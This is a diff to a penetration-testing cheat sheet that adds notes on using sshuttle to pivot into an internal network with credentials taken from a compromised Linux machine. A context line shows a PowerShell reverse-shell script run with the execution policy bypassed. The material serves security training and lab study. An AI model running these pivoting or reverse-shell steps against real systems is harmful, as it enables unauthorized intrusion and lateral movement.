@@ -821,6 +821,13 @@ powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victi
 ````
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
 ### Tools
+#### sshuttle
+##### Linux Enviorment
+````
+sshuttle -r sean@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
+#In this situation we have rooted a linux machine got user creds and can establish an sshuttle
+#You can visit the next network as normal and enumerate it as normal.
+````
 #### Chisel
 ##### Chisel Windows
 ````
